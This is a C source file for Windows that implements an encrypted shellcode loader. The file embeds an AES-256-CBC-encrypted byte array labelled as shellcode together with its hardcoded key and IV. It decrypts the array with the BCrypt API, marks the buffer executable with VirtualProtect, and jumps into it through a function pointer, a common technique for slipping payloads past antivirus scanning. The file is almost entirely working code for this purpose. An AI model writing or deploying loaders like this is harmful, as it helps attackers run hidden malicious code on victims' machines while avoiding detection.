#include <Windows.h>
#include <stdio.h>
#include <bcrypt.h>

#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(status)	        (((NTSTATUS)(status)) >= 0)

#define KEYSIZE				32
#define IVSIZE				16

unsigned char Data[] = {
		0x19, 0x33, 0x1B, 0xE8, 0x2A, 0x03, 0x3E, 0xB5, 0x7D, 0xD5, 0xEB, 0x4E, 0x2C, 0x6F, 0x69, 0x90,
		0x47, 0x8D, 0xED, 0xDD, 0xA3, 0x60, 0xFA, 0x5D, 0x5C, 0xAE, 0x60, 0xF9, 0x94, 0xA4, 0xED, 0x6E,
		0xAF, 0xE2, 0x25, 0x37, 0xDC, 0xDC, 0xD2, 0x14, 0x33, 0xB2, 0x61, 0xB2, 0xBE, 0x12, 0x5E, 0xB3,
		0x4C, 0x80, 0xA7, 0xC0, 0x38, 0x5C, 0x21, 0xB4, 0x26, 0xDA, 0xB1, 0x1D, 0x55, 0x92, 0x7A, 0x5D,
		0x2B, 0x64, 0x16, 0x2F, 0x54, 0x93, 0x14, 0x54, 0xEA, 0x19, 0x4E, 0x44, 0x9E, 0xE1, 0xA4, 0x48,
		0xE9, 0x18, 0x3F, 0x13, 0x85, 0x37, 0x0C, 0x89, 0x84, 0x4E, 0xB0, 0x19, 0xDB, 0xFA, 0xAB, 0x0D,
		0xB6, 0xA2, 0xDC, 0xCB, 0xAD, 0xED, 0x3B, 0xD2, 0x55, 0x32, 0xEB, 0x25, 0x6F, 0x26, 0xBF, 0xA7,
		0x40, 0x90, 0x14, 0x89, 0x5D, 0x9E, 0xDB, 0xD6, 0xB3, 0x07, 0xB7, 0x2B, 0x5B, 0x4D, 0x19, 0x2E,
		0x56, 0xA8, 0x83, 0x5F, 0x19, 0x67, 0x4C, 0xB9, 0x05, 0x37, 0x5D, 0x45, 0xFA, 0xBE, 0x30, 0xE9,
		0xCD, 0x47, 0x7D, 0x8A, 0xF7, 0x49, 0xDB, 0xD3, 0x59, 0xC5, 0x65, 0xAA, 0x0D, 0x77, 0x7B, 0x63,
		0xEE, 0x5E, 0xDF, 0x2E, 0x95, 0x5F, 0x99, 0xEA, 0x6E, 0x67, 0xD1, 0xEF, 0x01, 0xF8, 0xDC, 0x62,
		0x73, 0xA3, 0x1A, 0x3B, 0xCB, 0xB3, 0x5E, 0x1D, 0x89, 0x45, 0x9D, 0x3B, 0x79, 0x48, 0x83, 0xEF,
		0x29, 0xB8, 0x6E, 0x63, 0xB0, 0x0C, 0x03, 0x1C, 0x06, 0xBE, 0xED, 0x40, 0x18, 0xC2, 0xBD, 0x47,
		0x69, 0xA9, 0xEA, 0x7F, 0xFA, 0x18, 0x62, 0xBA, 0x75, 0x48, 0x17, 0x9E, 0x2D, 0x7F, 0xC9, 0x80,
		0xD4, 0xF7, 0x97, 0x41, 0x0F, 0x13, 0x52, 0x9C, 0xD7, 0x17, 0xD0, 0xD6, 0x58, 0xE3, 0x6B, 0x69,
		0xE7, 0x83, 0x94, 0xB2, 0xF5, 0x70, 0x02, 0x78, 0x0E, 0x37, 0x0A, 0xEC, 0x88, 0xE4, 0xDE, 0x84,
		0x3B, 0xA0, 0xC3, 0x9F, 0x2D, 0x99, 0x2F, 0x31, 0x66, 0x26, 0xAE, 0xB1, 0xB7, 0x45, 0x9B, 0xE9,
		0xCC, 0xD7, 0x40, 0x3A, 0x21, 0xD9, 0x39, 0xA8, 0xFC, 0x6F, 0xBF, 0x29, 0x71, 0x3F, 0xAC, 0x48 };


unsigned char pKey[] = {
		0x36, 0x8D, 0x83, 0x25, 0x60, 0x39, 0x41, 0xE3, 0x7C, 0x1F, 0x1E, 0xDE, 0x18, 0xE8, 0x2F, 0xA4,
		0x16, 0x3A, 0x93, 0xAC, 0xA5, 0xDC, 0x03, 0x97, 0x70, 0x1B, 0xAB, 0xB5, 0x15, 0x6C, 0x38, 0xCB };


unsigned char pIv[] = {
		0x16, 0xB1, 0xB1, 0x2C, 0x76, 0xD6, 0xAC, 0x3C, 0x80, 0x48, 0xE5, 0x26, 0x4B, 0x91, 0x4D, 0x60 };

typedef struct _AES {

	PBYTE	pPlainText;				// Base address of the plaintext data 
	DWORD	dwPlainSize;			// Size of the plaintext data

	PBYTE	pCipherText;			// Base address of the encrypted data	
	DWORD	dwCipherSize;			// Size of the encrypted data. This can vary from dwPlainSize when there is padding involved.

	PBYTE	pKey;					// The 32 byte key
	PBYTE	pIv;					// The 16 byte IV

}AES, * PAES;


// Generate random bytes of size sSize
VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {

	for (int i = 0; i < sSize; i++) {
		pByte[i] = (BYTE)rand() % 0xFF;
	}

}


// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}

// The decryption implementation
BOOL InstallAesDecryption(PAES pAes) {

	BOOL				bSTATE = TRUE;

	BCRYPT_ALG_HANDLE		hAlgorithm = NULL;
	BCRYPT_KEY_HANDLE		hKeyHandle = NULL;

	ULONG				cbResult = NULL;
	DWORD				dwBlockSize = NULL;
	DWORD				cbKeyObject = NULL;
	PBYTE				pbKeyObject = NULL;

	PBYTE				pbPlainText = NULL;
	DWORD				cbPlainText = NULL,

		// Intializing "hAlgorithm" as AES algorithm Handle
		STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
	STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Checking if block size is 16 bytes
	if (dwBlockSize != 16) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Allocating memory for the key object 
	pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
	if (pbKeyObject == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
	STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject of size cbKeyObject 
	STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Allocating enough memory for the output buffer, cbPlainText
	pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
	if (pbPlainText == NULL) {
		bSTATE = FALSE; goto _EndOfFunc;
	}
	// Running BCryptDecrypt again with pbPlainText as the output buffer
	STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
		bSTATE = FALSE; goto _EndOfFunc;
	}

	// Clean up
_EndOfFunc:
	if (hKeyHandle) {
		BCryptDestroyKey(hKeyHandle);
	}
	if (hAlgorithm) {
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
	}
	if (pbKeyObject) {
		HeapFree(GetProcessHeap(), 0, pbKeyObject);
	}
	if (pbPlainText != NULL && bSTATE) {
		// if everything went well, we save pbPlainText and cbPlainText
		pAes->pPlainText = pbPlainText;
		pAes->dwPlainSize = cbPlainText;
	}
	return bSTATE;

}

// Wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {

	if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
		return FALSE;

	// Intializing the struct
	AES Aes = {
		.pKey = pKey,
		.pIv = pIv,
		.pCipherText = pCipherTextData,
		.dwCipherSize = sCipherTextSize
	};

	if (!InstallAesDecryption(&Aes)) {
		return FALSE;
	}

	// Saving output
	*pPlainTextData = Aes.pPlainText;
	*sPlainTextSize = Aes.dwPlainSize;

	return TRUE;
}

int main() {

	// defining two variables, that will be used in SimpleDecryption, (the output buffer and its size)
	PVOID	pPlaintext = NULL;
	DWORD	dwPlainSize = NULL;

	printf("[i] Base Address of Encrypted Shellcode : 0x%p \n", Data);
	printf("[!] Decrypting shellcode..\n");

	// decryption
	if (!SimpleDecryption(Data, (DWORD)sizeof(Data), pKey, pIv, &pPlaintext, &dwPlainSize)) {
		return -1;
	}

	printf("[!] Shellcode successfully decrypted!\n");

	// printing the decrypted data to the screen as hex, this will look the same as the variable "Data" from the encryption snippet
	PrintHexData("PlainText", pPlaintext, dwPlainSize);

	printf("[i] Base Address of Decrypted Shellcode : 0x%p \n", pPlaintext);

	// Make the memory executable (Windows-specific)
	DWORD oldProtect;
	if (!VirtualProtect(pPlaintext, (size_t)dwPlainSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		perror("VirtualProtect error");
		return 1;
	}

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)pPlaintext;

	// Call the shellcode function
	shellcodeFunc();

	// freeing
	HeapFree(GetProcessHeap(), 0, pPlaintext);
	VirtualFree(Data, 0, MEM_RELEASE);
	return 0;

}
